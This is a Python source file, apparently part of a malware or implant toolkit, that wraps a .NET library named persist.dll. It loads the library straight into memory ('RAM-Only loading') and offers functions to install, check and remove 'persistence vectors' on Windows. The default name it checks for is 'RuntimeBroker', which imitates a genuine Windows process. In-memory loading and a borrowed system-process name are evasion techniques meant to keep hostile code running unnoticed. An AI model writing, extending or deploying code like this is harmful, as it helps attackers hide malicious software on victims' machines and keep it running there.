from core.resolver import (Resolver, _OS)
os = Resolver.get_mod(_OS)

import sys
import clr
from core.error_logger import log_error, log_info
from core.resolver import Resolver

class PersistManager:
    """Python wrapper for defense/persist.dll (VanguardCore.PersistManager)"""
    
    def __init__(self):
        self.dll_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "defense", "persist.dll")
        self._initialized = False
        self._manager = None
        self._init_dll()

    def _init_dll(self):
        try:
            from System.Reflection import Assembly
            from System.IO import File
            
            # Search paths for persist.dll
            search_paths = [
                self.dll_path,
                os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "persist.dll"),
                os.path.join(os.getcwd(), "native_modules", "persist.dll"),
                os.path.join(os.path.dirname(__file__), "persist.dll")
            ]
            
            for p in search_paths:
                if os.path.exists(p):
                    try:
                        # S-09: RAM-Only loading
                        raw_bytes = File.ReadAllBytes(os.path.abspath(p))
                        Assembly.Load(raw_bytes)
                        Resolver.load_native()
                        from VanguardCore import PersistManager as CSharpManager
                        self._manager = CSharpManager
                        self._initialized = True
                        break
                    except: continue
            
            if not self._initialized:
                log_error(f"Persistence DLL not found or failed to load from RAM.")
        except Exception as e:
            log_error(f"Critical error in persistence DLL loading: {e}")
            self._initialized = False

    def install_all(self, target_path: str = None):
        """Installs all persistence vectors"""
        if not self._initialized: return False
        try:
            if not target_path:
                target_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            
            self._manager.InstallAll(target_path)
            log_info(f"Persistence installed for {target_path}")
            return True
        except Exception as e:
            log_error(f"InstallAll error: {e}")
            return False

    def check_all(self, name: str = "RuntimeBroker") -> bool:
        """Checks if at least one persistence vector is active"""
        if not self._initialized: return False
        try:
            # We check for several common names if none provided
            # Note: C# side uses GenerateRandomName which can be tricky without storage
            # But we check for at least generic connectivity
            return self._manager.CheckExists(name)
        except Exception as e:
            log_error(f"CheckExists error: {e}")
            return False

    def remove_all(self, name: str = None):
        """Removes all persistence vectors"""
        if not self._initialized: return
        try:
            self._manager.RemoveAll(name)
            log_info("Persistence removed")
        except Exception as e:
            log_error(f"RemoveAll error: {e}")